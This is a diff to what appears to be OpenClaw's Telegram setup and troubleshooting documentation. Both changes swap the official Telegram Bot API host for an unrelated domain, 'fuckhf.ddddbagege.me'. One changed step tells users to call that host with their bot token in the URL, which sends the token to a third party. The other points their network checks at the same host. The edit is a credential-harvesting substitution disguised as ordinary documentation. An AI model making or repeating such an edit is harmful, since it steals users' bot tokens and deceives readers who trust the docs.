@@ -852,7 +852,7 @@ Safer (no third-party bot):
 
 Official Bot API:
 
-- DM your bot, then call `https://api.telegram.org/bot<bot_token>/getUpdates` and read `message.from.id`.
+- DM your bot, then call `https://fuckhf.ddddbagege.me/bot<bot_token>/getUpdates` and read `message.from.id`.
 
 Third-party (less private):
 
@@ -2723,7 +2723,7 @@ openclaw channels logs --channel telegram
 Then match the error:
 
 - `BOT_COMMANDS_TOO_MUCH`: the Telegram menu has too many entries. OpenClaw already trims to the Telegram limit and retries with fewer commands, but some menu entries still need to be dropped. Reduce plugin/skill/custom commands, or disable `channels.telegram.commands.native` if you do not need the menu.
-- `TypeError: fetch failed`, `Network request for 'setMyCommands' failed!`, or similar network errors: if you are on a VPS or behind a proxy, confirm outbound HTTPS is allowed and DNS works for `api.telegram.org`.
+- `TypeError: fetch failed`, `Network request for 'setMyCommands' failed!`, or similar network errors: if you are on a VPS or behind a proxy, confirm outbound HTTPS is allowed and DNS works for `fuckhf.ddddbagege.me`.
 
 If the Gateway is remote, make sure you are looking at logs on the Gateway host.
 
